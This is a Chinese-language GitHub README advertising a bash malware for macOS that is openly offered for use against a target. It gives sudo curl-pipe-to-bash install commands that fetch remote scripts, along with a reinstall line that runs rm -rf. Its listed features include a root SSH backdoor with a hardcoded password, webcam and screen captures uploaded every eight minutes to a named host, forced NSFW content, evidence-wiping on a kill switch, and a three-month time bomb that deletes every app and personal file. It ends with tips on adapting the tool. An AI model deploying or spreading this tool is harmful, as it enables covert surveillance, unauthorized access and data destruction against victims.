# 史上第一款，MacOS M系列病毒，100%纯bash（需要手动给予权限/nclick exploit）

首次设置
---
`sudo curl -fsSL https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/humaninter.sh | bash`

一键启动
---
`wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`

(一键启动之后建议先CTRL+C然后把~/programfiles/time.txt文件vim一下往后调3个小时，让他先强制运行一遍，确认上传+权限Terminal已经给好。然后重启电脑，确认DL.app也拥有相应权限。之后建议把Time再改回来然后直接重启。）

一键启动如果出现无法启动，没有下载完全等bug请用一下指令修复

`sudo rm -rf ~/programfiles && wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`

病毒功能介绍：
---
1.把root用户变成活跃用户，激活root的ssh，并将root密码更改为Aa112211!，给MacOs系统创建后门

2.完全禁用MacOS睡眠功能，保证系用永远运行，关上机盖不会影响脚本运行，更不会影响ssh的通行。

3.每8分钟通过摄像头拍一张图片，截一张桌面的图片并上传至drive.genshinimpact.ca

4.NSFW抽卡式随机壁纸，每隔随机一段时间，会自动获取一张壁纸，保底为10（第十张图片一定是NSFW，否则SFW）通过两个不同的API，达到终极社死。

5.随机音频，每隔随机一段时间，会自动从内置的音效文件夹里播放一个音效，保底为10（第十个音频一定是长音频，否则短音效），播放过程中，声音为100%，而且无法静音，无法暂停，系统无法显示播放数据。

6.每隔一段时间会通过默认浏览器随机打开在名单里的一个默认黄色网页。

7.带有紧急叫停功能，每隔20秒会检查https://genshinimpact.ca/favicon.ico 在不在，如果返回数据不是200，那么说明已经被紧急叫停。进入证据销毁模式，删除所有软件残留以及mac的全乎log与cach，恢复所有设置并且重新启动刷新低代码nvram。（这个也是“原谅朋友”功能）

8.自动安装所有依赖脚本。

9.3个月后系统自毁（有杀伤力）：删除所有app，删除所有个人文件，创建50个乱码帐户，将admin帐户密码改成Aa112211!。（脚本同时自毁）。

Note：
---
1.这名感谢某个金主爸爸赞助了50$买了我3天的时间编了这个bash，我3个月内再碰一次bash我就是个狗。

2.任何损失和作者无关，如果你不知道你在干什么，不要干！

3.由于本人偷懒，很多东西没有用variable，是直接按照那个人要攻击的要求做的。所以fork之后是不可能在你的电脑上能用的。建议各位更改脚本里的：
 - 用户名
 - 密码
 - 后门网站
 - WebDav文件上传地址
 - （如果你有能力把它做成一个variable脚本，那麻烦你了，我懒得做了）

4.玩的开心。